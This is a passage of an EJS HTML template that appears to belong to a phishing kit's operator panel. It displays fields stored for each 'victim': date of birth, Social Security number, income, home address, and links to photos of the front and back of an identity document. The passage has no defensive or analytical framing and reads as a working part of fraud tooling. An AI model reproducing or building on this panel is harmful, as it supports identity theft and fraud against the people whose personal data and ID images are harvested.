                                        <tr>
                                            <td>Suffix</td>
                                            <td>
                                                <%= victim.session.suffix %>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>Date Of Birth</td>
                                            <td>
                                                <%= victim.session.dob %>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>Social Security Number</td>
                                            <td>
                                                <%= victim.session.ssn %>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>Average Gross Income</td>
                                            <td>
                                                <%= victim.session.agi %>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>Street</td>
                                            <td>
                                                <%= victim.session.street %>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>City</td>
                                            <td>
                                                <%= victim.session.city %>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>State</td>
                                            <td>
                                                <%= victim.session.state %>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>Zip Code</td>
                                            <td>
                                                <%= victim.session.zip_code %>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>ID Front</td>
                                            <td><a href="/<%= victim.session.id_front %>">
                                                    <% if(victim.session.id_front) { %>Open Image<%}%>
                                                </a></td>
                                        </tr>
                                        <tr>
                                            <td>ID Back</td>
                                            <td><a href="/<%= victim.session.id_back %>">
                                                    <% if(victim.session.id_back) { %>Open Image<%}%>
                                                </a></td>
